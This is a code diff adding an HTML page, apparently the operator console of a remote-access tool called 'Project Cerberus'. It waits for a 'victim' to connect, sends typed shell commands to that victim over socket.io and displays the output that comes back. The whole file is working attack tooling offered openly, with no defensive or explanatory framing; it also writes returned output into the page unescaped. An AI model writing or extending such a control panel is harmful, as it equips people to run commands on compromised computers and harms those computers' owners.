@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cerberus — Remote Shell</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.1/socket.io.min.js"></script>
+    <style>
+        body { background: #111; color: #00ff00; font-family: monospace; padding: 20px; }
+        #output { 
+            height: 500px; overflow-y: scroll; 
+            background: #000; padding: 10px; 
+            border: 1px solid #333; margin-bottom: 10px;
+            white-space: pre-wrap;
+        }
+        #input-row { display: flex; gap: 10px; }
+        #cmd { 
+            flex: 1; background: #000; color: #00ff00; 
+            border: 1px solid #333; padding: 8px; font-family: monospace;
+        }
+        button { 
+            background: #222; color: #00ff00; 
+            border: 1px solid #333; padding: 8px 16px; cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h2> Project Cerberus — Remote Shell</h2>
+    <div id="output">[waiting for victim to connect...]\n</div>
+    <div id="input-row">
+        <input id="cmd" type="text" placeholder="enter command..." />
+        <button onclick="sendCommand()">Send</button>
+    </div>
+
+    <script>
+        const socket = io();
+        const output = document.getElementById("output");
+        const cmdInput = document.getElementById("cmd");
+
+        // Receive output from victim
+        socket.on("shell_output", function(data) {
+            output.innerHTML += data.output + "\n";
+            output.scrollTop = output.scrollHeight;
+        });
+
+        // Send command to victim
+        function sendCommand() {
+            const cmd = cmdInput.value;
+            if (!cmd) return;
+            output.innerHTML += `\n> ${cmd}\n`;
+            socket.emit("shell_command", { command: cmd });
+            cmdInput.value = "";
+        }
+
+        // Send on Enter key
+        cmdInput.addEventListener("keydown", function(e) {
+            if (e.key === "Enter") sendCommand();
+        });
+    </script>
+</body>
+</html>
